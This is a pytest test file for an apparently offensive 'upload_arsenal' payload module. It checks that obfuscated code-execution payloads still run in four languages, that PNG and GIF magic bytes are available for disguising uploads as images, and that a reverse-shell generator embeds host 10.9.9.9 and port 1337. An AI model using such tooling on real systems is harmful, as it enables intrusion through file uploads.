import shutil
import subprocess
import tempfile
import os

import pytest

from upload_arsenal import payloads

RUNNERS = {
    "php": ("php", ".php"),
    "python": ("python3", ".py"),
    "nodejs": ("node", ".js"),
    "ruby": ("ruby", ".rb"),
}
MARKER = "code execution confirmed"


@pytest.mark.parametrize("lang", list(RUNNERS))
def test_obfuscated_poc_still_executes(lang):
    binary, ext = RUNNERS[lang]
    if not shutil.which(binary):
        pytest.skip(f"{binary} not installed")
    code = payloads.obfuscate(lang, payloads.POC[lang])
    f = tempfile.NamedTemporaryFile("w", suffix=ext, delete=False)
    f.write(code)
    f.close()
    try:
        r = subprocess.run([binary, f.name], capture_output=True, text=True, timeout=15)
        assert MARKER in (r.stdout + r.stderr)
    finally:
        os.unlink(f.name)


def test_magic_bytes_known():
    assert payloads.magic_for("png").startswith(b"\x89PNG")
    assert payloads.magic_for("gif") == b"GIF89a"
    assert payloads.magic_for("unknown") == b""


def test_revshell_bakes_host_port():
    s = payloads.revshell("python", "10.9.9.9", 1337)
    assert "10.9.9.9" in s and "1337" in s
